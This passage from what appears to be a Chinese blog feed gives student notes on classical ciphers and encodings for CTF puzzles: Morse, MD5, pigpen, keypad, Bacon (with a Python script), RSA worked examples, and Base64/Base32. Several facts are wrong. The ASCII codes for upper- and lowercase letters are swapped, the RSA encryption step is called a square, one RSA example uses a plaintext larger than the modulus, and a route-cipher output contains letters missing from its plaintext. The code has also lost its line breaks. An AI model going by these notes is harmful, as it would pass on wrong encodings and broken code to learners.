align="center">“</td><td align="center">.-..-.</td></tr><tr><td align="center">(</td><td align="center">-.–.</td><td align="center">)</td><td align="center">-.–.-</td><td align="center">$</td><td align="center">…-..-</td><td align="center">&amp;</td><td align="center">….</td></tr><tr><td align="center">@</td><td align="center">.–.-.</td><td align="center">+</td><td align="center">.-.-.</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>数字长码</p><table><thead><tr><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">—–</td><td align="center">1</td><td align="center">.—-</td><td align="center">2</td><td align="center">..—</td><td align="center">3</td><td align="center">…–</td></tr><tr><td align="center">4</td><td align="center">….-</td><td align="center">5</td><td align="center">…..</td><td align="center">6</td><td align="center">-….</td><td align="center">7</td><td align="center">–…</td></tr><tr><td align="center">8</td><td align="center">—..</td><td align="center">9</td><td align="center">—-.</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>在线解密网址👉<a href="https://www.matools.com/morse">摩斯电码在线解密</a>。</p><hr><h2 id="三-MD5-哈希算法"><a href="#三-MD5-哈希算法" class="headerlink" title="三.MD5(哈希算法)"></a>三.MD5(哈希算法)</h2><p>MD5不可逆，只能通过枚举，MD5的特征是，<code>(1)长度固定</code>,<code>(2)只可能小写和数字32个字符</code>👉<a href="https://cmd5.com/">在线CMD加密解密</a>，比如加密<code>123456</code>，如下。</p><p>MD5:<code>e10adc3949ba59abbe56e057f20f883e</code>。</p><hr><h2 id="四-猪圈密码"><a href="#四-猪圈密码" class="headerlink" title="四.猪圈密码"></a>四.猪圈密码</h2><p>用格子来做的简单替换，加密，如下图格子适应，和对应图。</p><p><img src="/images/wordimage/20220201/zhujuan.png"></p><p>如下是字母对应图👇。</p><p><img src="/images/wordimage/20220201/zhujuan2.png"></p><p>按照图表来加密解密即可。</p><hr><h2 id="五-九宫格按键加密"><a href="#五-九宫格按键加密" class="headerlink" title="五.九宫格按键加密"></a>五.九宫格按键加密</h2><p>也是简单的替换密码，如下表替换。</p><table><thead><tr><th align="center">1</th><th align="center">2 abc</th><th align="center">3 def</th></tr></thead><tbody><tr><td align="center">4 ghi</td><td align="center">5 jkl</td><td align="center">6 mno</td></tr><tr><td align="center">7 pqrs</td><td align="center">8 tuv</td><td align="center">9 wxyz</td></tr></tbody></table><p>没有1，比如<code>a</code>在第二个格子那么就是<code>21</code>，<code>z</code>在第9个格子就是<code>94</code>，<code>k</code>在第五个格子就是<code>52</code>。</p><hr><h2 id="六-26键加密"><a href="#六-26键加密" class="headerlink" title="六.26键加密"></a>六.26键加密</h2><h3 id="1-QWE密码"><a href="#1-QWE密码" class="headerlink" title="1.QWE密码"></a>1.QWE密码</h3><p>指的是按照QWE键盘顺序来加密也就是QWERTYUIOP这种，如下表所示。</p><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th></tr></thead><tbody><tr><td align="center">Q</td><td align="center">W</td><td align="center">E</td><td align="center">R</td><td>T</td><td>Y</td><td>U</td><td>I</td><td>O</td><td>P</td><td>A</td><td>S</td><td>D</td><td>F</td><td>G</td><td>H</td><td>J</td><td>K</td><td>L</td><td>Z</td><td>X</td><td>C</td><td>V</td><td>B</td><td>N</td><td>M</td></tr></tbody></table><p>入👆表加密即可。</p><h3 id="2-坐标加密"><a href="#2-坐标加密" class="headerlink" title="2.坐标加密"></a>2.坐标加密</h3><p>先如下图所示，如果是(红色,黄色)也就是先行后列的顺序，<code>(1,1)=Q，(1,2)=W，(2,1)=A，(2,2)=S</code>。</p><p>如果是(黄色，红色)也就是先列后行的顺序，<code>(1,1)=Q，(1,2)=A，(2,1)=W，(2,2)=S</code>。</p><p><img src="/images/wordimage/20220201/keybord.png"></p><hr><h2 id="七-曲路密码"><a href="#七-曲路密码" class="headerlink" title="七.曲路密码"></a>七.曲路密码</h2><p>也是一种换位密码，需要双方事先约定好密钥(曲路路线)</p><p>假设明文是<code>Takagisan is the best in the world</code>。</p><p>填入4行七列表(需要事先约定好)</p><table><thead><tr><th align="center">T</th><th align="center">a</th><th align="center">k</th><th align="center">a</th><th align="center">g</th><th align="center">i</th><th align="center">s</th></tr></thead><tbody><tr><td align="center">a</td><td align="center">n</td><td align="center">i</td><td align="center">s</td><td align="center">t</td><td align="center">h</td><td align="center">e</td></tr><tr><td align="center">b</td><td align="center">e</td><td align="center">s</td><td align="center">t</td><td align="center">i</td><td align="center">n</td><td align="center">t</td></tr><tr><td align="center">h</td><td align="center">e</td><td align="center">w</td><td align="center">o</td><td align="center">r</td><td align="center">l</td><td align="center">d</td></tr></tbody></table><p>如下图👇加密回环路线，从右往左(需要事先声明好)，最终加密效果就是，<code>dtesihnlritgastowsjkaneehbat</code>，解密也非常简单，按照约定，4行7列，回环路线从右往左，密文从左到右，重新排序即可。</p><p><img src="/images/wordimage/20220201/huihuan.png"></p><hr><h2 id="八-当铺密码"><a href="#八-当铺密码" class="headerlink" title="八.当铺密码"></a>八.当铺密码</h2><p>当铺密码就是中文与数字的结合，当前的汉字有多少笔画出头，就是转换成数字几。</p><p>如下表，就是当铺密码所对应的汉字和所对应的数字。</p><table><thead><tr><th align="center">汉字</th><th align="center">所对应的数字</th></tr></thead><tbody><tr><td align="center">由</td><td align="center">1</td></tr><tr><td align="center">中</td><td align="center">2</td></tr><tr><td align="center">人</td><td align="center">3</td></tr><tr><td align="center">工</td><td align="center">4</td></tr><tr><td align="center">大</td><td align="center">5</td></tr><tr><td align="center">王</td><td align="center">6</td></tr><tr><td align="center">夫</td><td align="center">7</td></tr><tr><td align="center">井</td><td align="center">8</td></tr><tr><td align="center">羊</td><td align="center">9</td></tr></tbody></table><p>比如<code>夫大 工大 夫井</code>，就是<code>75 45 78</code>，对应ASCII码就是<code>KEN</code>。</p><hr><h2 id="九-培根密码加密方式"><a href="#九-培根密码加密方式" class="headerlink" title="九.培根密码加密方式"></a>九.培根密码加密方式</h2><p>第一种方法如下表</p><table><thead><tr><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th><th align="center">字母</th><th align="center">加密后</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">aaaaa</td><td align="center">B</td><td align="center">aaaab</td><td align="center">C</td><td align="center">aaaba</td><td align="center">D</td><td align="center">aaabb</td><td align="center">E</td><td align="center">aabaa</td><td align="center">F</td><td align="center">aabab</td><td align="center">G</td><td align="center">aabba</td><td align="center">H</td><td align="center">aabbb</td><td align="center">I</td><td align="center">abaaa</td><td align="center">J</td><td align="center">abaab</td></tr><tr><td align="center">K</td><td align="center">ababa</td><td align="center">L</td><td align="center">ababb</td><td align="center">M</td><td align="center">abbaa</td><td align="center">N</td><td align="center">abbab</td><td align="center">O</td><td align="center">abbba</td><td align="center">P</td><td align="center">abbbb</td><td align="center">Q</td><td align="center">baaaa</td><td align="center">R</td><td align="center">baab</td><td align="center">S</td><td align="center">baaba</td><td align="center">T</td><td align="center">baabb</td></tr><tr><td align="center">U</td><td align="center">babaa</td><td align="center">V</td><td align="center">babab</td><td align="center">W</td><td align="center">babba</td><td align="center">X</td><td align="center">babbb</td><td align="center">Y</td><td align="center">bbaaa</td><td align="center">Z</td><td align="center">bbaab</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>第二种方法如下表</p><table><thead><tr><th>字母</th><th>加密后</th><th>字母</th><th>加密后</th><th>字母</th><th>加密后</th><th>字母</th><th>加密后</th></tr></thead><tbody><tr><td>a</td><td>AAAAA</td><td>g</td><td>AABBA</td><td>n</td><td>ABBAA</td><td>t</td><td>BAABA</td></tr><tr><td>b</td><td>AAAAB</td><td>h</td><td>AABBB</td><td>o</td><td>ABBAB</td><td>u-v</td><td>BAABB</td></tr><tr><td>c</td><td>AAABA</td><td>i-j</td><td>ABAAA</td><td>p</td><td>ABBBA</td><td>w</td><td>BABAA</td></tr><tr><td>d</td><td>AAABBA</td><td>k</td><td>ABAAB</td><td>q</td><td>ABBBB</td><td>x</td><td>BABAB</td></tr><tr><td>e</td><td>AABAA</td><td>l</td><td>ABABA</td><td>r</td><td>BAAAA</td><td>y</td><td>BABBA</td></tr><tr><td>f</td><td>AABAB</td><td>m</td><td>ABABB</td><td>s</td><td>BAAAB</td><td>z</td><td>BABBB</td></tr></tbody></table><p>加密解密python程序如下👇，源自于网络，自己经过了一些修改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> realphabet <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">]</span>first_cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaaa"</span><span class="token punctuation">,</span><span class="token string">"aaaab"</span><span class="token punctuation">,</span><span class="token string">"aaaba"</span><span class="token punctuation">,</span><span class="token string">"aaabb"</span><span class="token punctuation">,</span><span class="token string">"aabaa"</span><span class="token punctuation">,</span><span class="token string">"aabab"</span><span class="token punctuation">,</span><span class="token string">"aabba"</span><span class="token punctuation">,</span><span class="token string">"aabbb"</span><span class="token punctuation">,</span><span class="token string">"abaaa"</span><span class="token punctuation">,</span><span class="token string">"abaab"</span><span class="token punctuation">,</span><span class="token string">"ababa"</span><span class="token punctuation">,</span><span class="token string">"ababb"</span><span class="token punctuation">,</span><span class="token string">"abbaa"</span><span class="token punctuation">,</span><span class="token string">"abbab"</span><span class="token punctuation">,</span><span class="token string">"abbba"</span><span class="token punctuation">,</span><span class="token string">"abbbb"</span><span class="token punctuation">,</span><span class="token string">"baaaa"</span><span class="token punctuation">,</span><span class="token string">"baaab"</span><span class="token punctuation">,</span><span class="token string">"baaba"</span><span class="token punctuation">,</span><span class="token string">"baabb"</span><span class="token punctuation">,</span><span class="token string">"babaa"</span><span class="token punctuation">,</span><span class="token string">"babab"</span><span class="token punctuation">,</span><span class="token string">"babba"</span><span class="token punctuation">,</span><span class="token string">"babbb"</span><span class="token punctuation">,</span><span class="token string">"bbaaa"</span><span class="token punctuation">,</span><span class="token string">"bbaab"</span><span class="token punctuation">]</span>second_cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaaa"</span><span class="token punctuation">,</span><span class="token string">"aaaab"</span><span class="token punctuation">,</span><span class="token string">"aaaba"</span><span class="token punctuation">,</span><span class="token string">"aaabb"</span><span class="token punctuation">,</span><span class="token string">"aabaa"</span><span class="token punctuation">,</span><span class="token string">"aabab"</span><span class="token punctuation">,</span><span class="token string">"aabba"</span><span class="token punctuation">,</span><span class="token string">"aabbb"</span><span class="token punctuation">,</span><span class="token string">"abaaa"</span><span class="token punctuation">,</span><span class="token string">"abaaa"</span><span class="token punctuation">,</span><span class="token string">"abaab"</span><span class="token punctuation">,</span><span class="token string">"ababa"</span><span class="token punctuation">,</span><span class="token string">"ababb"</span><span class="token punctuation">,</span><span class="token string">"abbaa"</span><span class="token punctuation">,</span><span class="token string">"abbab"</span><span class="token punctuation">,</span><span class="token string">"abbba"</span><span class="token punctuation">,</span><span class="token string">"abbbb"</span><span class="token punctuation">,</span><span class="token string">"baaaa"</span><span class="token punctuation">,</span><span class="token string">"baaab"</span><span class="token punctuation">,</span><span class="token string">"baaba"</span><span class="token punctuation">,</span><span class="token string">"baabb"</span><span class="token punctuation">,</span><span class="token string">"baabb"</span><span class="token punctuation">,</span><span class="token string">"babaa"</span><span class="token punctuation">,</span><span class="token string">"babab"</span><span class="token punctuation">,</span><span class="token string">"babba"</span><span class="token punctuation">,</span><span class="token string">"babbb"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入字符来加密:\n"</span><span class="token punctuation">)</span>    e_string1 <span class="token operator">=</span> <span class="token string">""</span>    e_string2 <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> index <span class="token keyword">in</span> string<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> alphabet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                e_string1 <span class="token operator">+=</span> first_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                e_string2 <span class="token operator">+=</span> second_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第一种加密方式结果是:\n"</span><span class="token operator">+</span>e_string1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第二种加密方式结果是:\n"</span><span class="token operator">+</span>e_string2<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    e_string <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入字符来解密:\n"</span><span class="token punctuation">)</span>    e_array <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">".&#123;5&#125;"</span><span class="token punctuation">,</span>e_string<span class="token punctuation">)</span>    d_string1 <span class="token operator">=</span> <span class="token string">""</span>    d_string2 <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> index <span class="token keyword">in</span> e_array<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> first_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                d_string1 <span class="token operator">+=</span> alphabet<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> second_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                d_string2 <span class="token operator">+=</span> alphabet<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第一种解密结果是:\n"</span><span class="token operator">+</span>d_string1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第二种解密结果是:\n"</span><span class="token operator">+</span>d_string2<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t*******培根密码加密解密*******"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入应该是小写密码只包含ab"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.加密\n2.解密\n3.退出"</span><span class="token punctuation">)</span>        s_number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入数字来选择\n"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> s_number <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>            encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> s_number <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>            decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> s_number <span class="token operator">==</span> <span class="token string">"3"</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="十-RSA算法加密"><a href="#十-RSA算法加密" class="headerlink" title="十.RSA算法加密"></a>十.RSA算法加密</h2><p>RSA算法，应该算难的一种了，视频可以去看李永乐老师的👉<a href="https://www.bilibili.com/video/BV1Ts411H7u9?from=search&seid=7967272613449962470">李永乐老师讲RSA</a>，首先需要知道的东西如下👇。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1.两个质数:p q(只有1和他本身两个约数的数叫做质数)2.n=p*q3.φ(n) = (p-1)(q-1)  欧拉函数4.公钥e是一个1&lt;e&lt;φ(n)的整数，e和φ(n)必须要互质  私钥d 必须是(e*d)modφ(n)=1，假设φ(n)是20，那  e取值为3，d取值为7，就是(3*7)mod20=1，余数就  可以是1，那么私钥就可以是为7。5.加密，假设M是明文，m的e的平方除以n余数就是c6.解密，C为密文，同时私钥d,c的d次方除以n余数就是m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看懂如上即可看不懂怎么办，我也看不懂，如下的带数操作。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">m=14e=3p=5q=11请写出RSA加密解密过程和结果<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>求n：p*q=5*11=55</p><p>求φ(n)：φ(n)=(p-1)*(q-1)=(5-1)(11-1)=40</p><p>求d：已知求d公式为<code>(e*d)modφ(n)=1</code>，就是<code>(3*d)mod40=1</code>，算出d为27。</p><p>加密：已知公式为<code>(m^e)modn=c</code>套用<code>(14^3)mod55=c</code>，算出c为49</p><p>解密：已知公式为<code>(c^d)modn=m</code>套用<code>(49^27)mod55=m</code>，算出m为14</p><p>第二测试题如下👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">p=43q=59e=13m=134879475204用RSA对m进行加密<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加密公式为<code>(m^e)modn=c</code>，我们需要知道e和n即可算出c。</p><p>求n：n=p*q=43*59=2537</p><p>加密m：(134879475204^e)mod2537=1202</p><hr><p>未完待续…..</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中常见密码学(一)</title>
      <link href="/2022/027896669f.html"/>
      <url>/2022/027896669f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考，我们任课老师的WORD和PPT，结合自己的理解，在结合网上文章的理解。</p><h2 id="一-BASE64编码"><a href="#一-BASE64编码" class="headerlink" title="一.BASE64编码"></a>一.BASE64编码</h2><p>BASE64编码中，特征和所拥有的字符<code>字母:A-Z a-z;数字:0-9;符号:+ / </code>，然后末尾经常有一个“=”或者两个“==”。</p><p>原理，先把需要加密的字符串每个字符转换成ASCII码，然后ASCII码转换成二进制为8位二进制数字表示，然后在以六位二进制为一组转十进制，最后查找对应的BASE64对照表即可。</p><p>ASCII表，常用的无非就是大写字母和小写字母，大写字母的<code>A</code>开始是<code>97</code>，小写字母的<code>a</code>开始是<code>65</code>，推算下即可。</p><p>比如，这里需要加密“Ken”这个字符串，里面有大写和小写，查找ASCII码表，分别对应的是<code>75 101 110</code>，转换成二进制<code>75:01001011; 101:01100101; 110:01101110;</code>，先并排在一起，就是<strong>010010110110010101101110</strong>，然后在以六个为一组排序👉<strong>010010 | 110110 | 010101 | 101110</strong>，将这六个二进制重新转换成十进制，分别对应的是，<code>18 54 21 46</code>，然后对应base64码表，找出对应的上面重新转换成的十进制数字即可，分别是👉<strong>S2Vu</strong>，所以Ken这个字符串BASE64加密编码之后是<code>S2Vu</code>，如果不太清楚，看如下表格。</p><table><thead><tr><th align="center">文本</th><th align="center">K</th><th align="center">e</th><th align="center">n</th><th>NULL</th></tr></thead><tbody><tr><td align="center">ASCII编码</td><td align="center">75</td><td align="center">101</td><td align="center">110</td><td>NULL</td></tr><tr><td align="center">二进制位</td><td align="center">01001011</td><td align="center">01100101</td><td align="center">01101110</td><td>NULL</td></tr><tr><td align="center">分组</td><td align="center">010010</td><td align="center">110110</td><td align="center">010101</td><td>101110</td></tr><tr><td align="center">转换后的十进制&amp;BASE64码表索引</td><td align="center">18</td><td align="center">54</td><td align="center">21</td><td>46</td></tr><tr><td align="center">结果&amp;Base64码表</td><td align="center">S</td><td align="center">2</td><td align="center">V</td><td>u</td></tr></tbody></table><p>这样应该就差不多了，附上BASE64索引表，如下</p><table><thead><tr><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td></td><td align="center">16</td><td align="center">Q</td><td></td><td align="center">32</td><td align="center">g</td><td></td><td align="center">48</td><td align="center">w</td></tr><tr><td align="center">1</td><td align="center">B</td><td></td><td align="center">17</td><td align="center">R</td><td></td><td align="center">33</td><td align="center">h</td><td></td><td align="center">49</td><td align="center">x</td></tr><tr><td align="center">2</td><td align="center">C</td><td></td><td align="center">18</td><td align="center">S</td><td></td><td align="center">34</td><td align="center">i</td><td></td><td align="center">50</td><td align="center">y</td></tr><tr><td align="center">3</td><td align="center">D</td><td></td><td align="center">19</td><td align="center">T</td><td></td><td align="center">35</td><td align="center">j</td><td></td><td align="center">51</td><td align="center">z</td></tr><tr><td align="center">4</td><td align="center">E</td><td></td><td align="center">20</td><td align="center">U</td><td></td><td align="center">36</td><td align="center">k</td><td></td><td align="center">52</td><td align="center">0</td></tr><tr><td align="center">5</td><td align="center">F</td><td></td><td align="center">21</td><td align="center">V</td><td></td><td align="center">37</td><td align="center">l</td><td></td><td align="center">53</td><td align="center">1</td></tr><tr><td align="center">6</td><td align="center">G</td><td></td><td align="center">22</td><td align="center">W</td><td></td><td align="center">38</td><td align="center">m</td><td></td><td align="center">54</td><td align="center">2</td></tr><tr><td align="center">7</td><td align="center">H</td><td></td><td align="center">23</td><td align="center">X</td><td></td><td align="center">39</td><td align="center">n</td><td></td><td align="center">55</td><td align="center">3</td></tr><tr><td align="center">8</td><td align="center">I</td><td></td><td align="center">24</td><td align="center">Y</td><td></td><td align="center">40</td><td align="center">o</td><td></td><td align="center">56</td><td align="center">4</td></tr><tr><td align="center">9</td><td align="center">J</td><td></td><td align="center">25</td><td align="center">Z</td><td></td><td align="center">41</td><td align="center">p</td><td></td><td align="center">57</td><td align="center">5</td></tr><tr><td align="center">10</td><td align="center">K</td><td></td><td align="center">26</td><td align="center">a</td><td></td><td align="center">42</td><td align="center">q</td><td></td><td align="center">58</td><td align="center">6</td></tr><tr><td align="center">11</td><td align="center">L</td><td></td><td align="center">27</td><td align="center">b</td><td></td><td align="center">43</td><td align="center">r</td><td></td><td align="center">59</td><td align="center">7</td></tr><tr><td align="center">12</td><td align="center">M</td><td></td><td align="center">28</td><td align="center">c</td><td></td><td align="center">44</td><td align="center">s</td><td></td><td align="center">60</td><td align="center">8</td></tr><tr><td align="center">13</td><td align="center">N</td><td></td><td align="center">29</td><td align="center">d</td><td></td><td align="center">45</td><td align="center">t</td><td></td><td align="center">61</td><td align="center">9</td></tr><tr><td align="center">14</td><td align="center">O</td><td></td><td align="center">30</td><td align="center">e</td><td></td><td align="center">46</td><td align="center">u</td><td></td><td align="center">62</td><td align="center">+</td></tr><tr><td align="center">15</td><td align="center">P</td><td></td><td align="center">37</td><td align="center">f</td><td></td><td align="center">47</td><td align="center">v</td><td></td><td align="center">63</td><td align="center">/</td></tr></tbody></table><p>在附上一张ASCII码表图，如下图，图来自于网络。</p><p><img src="/images/wordimage/20220201/ASCII.jpg"></p><h3 id="1-有等号”-”的情况"><a href="#1-有等号”-”的情况" class="headerlink" title="1.有等号”=”的情况"></a>1.有等号”=”的情况</h3><p>比如<code>a</code>这个字母，ASCII码是<code>65</code>，转换成二进制是<strong>01000001</strong>，转换成六个一组<strong>010000 | 01</strong>，就会发现后面不足以组成六位数，就可以在后面添零，就变成了👉<strong>010000 | 010000</strong>，转换成十进制就是<code>16</code>，然后根据BASE64码表对应的是<code>Q</code>，那么a的加密后就是<code>QQ</code>，但是我自己的理解是，加密后的长度也就是编码后的长度必须能整除<code>4</code>，才可以，这里QQ不能整除<code>4</code>所以不行，就可以加上<code>=</code>，长度就可以了，所以最终的编码就是<code>QQ==</code>。</p><p>另外一种理解，如果要进行编码的字符串，不能被3整除，<code>后面会多出一个字节或者两个字节</code>，就可以使用“==”来代替，比如编码<code>a</code>，不能被三整除，还差两位就可以被三整除，就可以在最终编码结果加上两个”==”，结合如下图理解更好。</p><p><img src="/images/wordimage/20220201/base64.png"></p><hr><h2 id="二-base32加密"><a href="#二-base32加密" class="headerlink" title="二.base32加密"></a>二.base32加密</h2><p>和base64加密差不多，这里直接举例子，先看下表是base32的索引表，比如这里我要BASE32编码,<code>Ken</code>，对应的ASCII码分别是，<code>75 101 110</code>，转换成二进制分别对应的是<code>75:01001011; 101:01100101; 110:01101110</code>，然后合在一起，是<strong>0100101101100101011011100</strong>，然后在以五个一组排序👉<strong>01001 | 01101 | 10010 | 10110 | 11100</strong>，然后在转换成十进制就是，<code>9 13 18 22 28</code>，根据下面的索引表，就是，<code>JNSW4</code>，这里只有五个数，必须要四个四个一组，不足四个就用<code>=</code>，来填充，所以就是<code>JNSW4===</code>。</p><table><thead><tr><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td></td><td align="center">9</td><td align="center">J</td><td></td><td align="center">18</td><td align="center">S</td><td></td><td align="center">27</td><td align="center">3</td></tr><tr><td align="center">1</td><td align="center">B</td><td></td><td align="center">10</td><td align="center">K</td><td></td><td align="center">19</td><td align="center">T</td><td></td><td align="center">28</td><td align="center">4</td></tr><tr><td align="center">2</td><td align="center">C</td><td></td><td align="center">11</td><td align="center">L</td><td></td><td align="center">20</td><td align="center">U</td><td></td><td align="center">29</td><td align="center">5</td></tr><tr><td align="center">3</td><td align="center">D</td><td></td><td align="center">12</td><td align="center">M</td><td></td><td align="center">21</td><td align="center">V</td><td></td><td align="center">30</td><td align="center">6</td></tr><tr><td align="center">4</td><td align="center">E</td><td></td><td align="center">13</td><td align="center">N</td><td></td><td align="center">22</td><td align="center">W</td><td></td><td align="center">31</td><td align="center">7</td></tr><tr><td align="center">5</td><td align="center">F</td><td></td><td align="center">14</td><td align="center">O</td><td></td><td align="center">23</td><td align="center">X</td><td></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">6</td><td align="center">G</td><td></td><td align="center">15</td><td align="center">P</td><td></td><td align="center">24</td><td align="center">Y</td><td></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">7</td><td align="center">H</td><td></td><td align="center">16</td><td align="center">Q</td><td></td><td align="center">25</td><td align="center">Z</td><td></td><td align="center"></td><td 